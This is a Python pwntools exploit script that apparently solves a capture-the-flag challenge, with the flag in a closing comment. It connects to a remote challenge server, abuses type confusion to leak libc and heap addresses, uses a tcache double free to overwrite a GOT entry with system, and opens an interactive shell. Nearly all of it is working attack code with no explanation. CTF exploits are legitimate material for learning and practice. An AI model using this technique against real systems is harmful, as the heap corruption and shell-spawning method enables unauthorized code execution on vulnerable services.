import pwn


HOST, PORT = '13.231.207.73', 9007
DEBUG = False

if DEBUG:
    env = {'LD_LIBRARY_PATH': '.'}
    p = pwn.process(['./ld-2.27.so', './chall'], env=env)
else:
    p = pwn.remote(HOST, PORT)
pwn.context.log_level = 'DEBUG'

libc = pwn.ELF('./libc-2.27.so')


def Menu(i):
    p.recvuntil('> ')
    p.sendline(str(i))


def Add(data, t):
    Menu(1)

    p.recvuntil('Type(long=1/double=2/str=3): ')
    p.sendline(str(t))
    p.recvuntil('Data: ')
    if t == 1 or t == 2:
        p.sendline(str(data))
    if t == 3 and len(data) == 0x7F:
        p.send(data)
    if t == 3 and len(data) < 0x7F:
        p.sendline(data)


def Get(index, t):
    Menu(2)

    p.recvuntil('Index: ')
    p.sendline(str(index))
    p.recvuntil('Type(long=1/double=2/str=3): ')
    p.sendline(str(t))

    p.recvuntil('Data: ')
    return p.recvline(keepends=False)


def Edit(index, data, t):
    Menu(3)

    p.recvuntil('Index: ')
    p.sendline(str(index))
    p.recvuntil('Type(long=1/double=2/str=3): ')
    p.sendline(str(t))
    p.recvuntil('Data: ')
    if t == 1 or t == 2:
        p.sendline(str(data))
    if t == 3 and len(data) == 0x7F:
        p.send(data)
    if t == 3 and len(data) < 0x7F:
        p.sendline(data)


def Delete(index):
    Menu(4)

    p.recvuntil('Index: ')
    p.sendline(str(index))


Add(0x602018, 1)
libc_base = pwn.u64(Get(0, 3).ljust(8, b'\x00')) - libc.symbols[b'puts']
pwn.log.info('libc.so.6: 0x{:012X}'.format(libc_base))

Delete(0)

Add('ironore15', 3)
heap_base = int(Get(0, 1)) - 0x2B0
pwn.log.info('[heap]: 0x{:012X}'.format(heap_base))

Add(heap_base + 0x2B0, 1)

Delete(0)
Delete(0)

Add(pwn.p64(0x602030), 3)

Add('ironore15', 3)

Add(pwn.p64(libc_base + libc.symbols[b'system']), 3)
Add('/bin/sh', 2)

pwn.context.log_level = 'INFO'
p.interactive()

# zer0pts{m4y_th3_typ3_b3_w1th_y0u}
